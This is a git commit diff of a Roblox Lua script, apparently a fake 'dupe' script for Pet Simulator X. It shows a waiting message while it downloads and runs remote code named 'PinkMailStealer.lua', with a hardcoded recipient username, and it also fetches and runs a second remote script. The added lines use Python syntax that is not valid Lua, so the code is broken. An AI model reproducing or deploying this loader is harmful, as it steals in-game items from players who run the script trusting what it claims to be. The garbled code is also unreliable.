f534b630d74d02d73d9a552a77ac04e75f89d7e0
jefrey <126723194+jeffreyDarmer1443123@users.noreply.github.com>
2023-03-05 03:54:35 +0100

    Update Video.lua

--- Video.lua
+++ Video.lua
@@ -1,6 +1,9 @@
 _G.Name = "Please Wait till its Ready with Loading"
 _G.Username = "plakins8"
+b = 1
+
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
-wait(30)
+while not a == 1:
+  b += 1  
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jmesfo0/RobloxScripts/main/psx-jmes.lua"))()
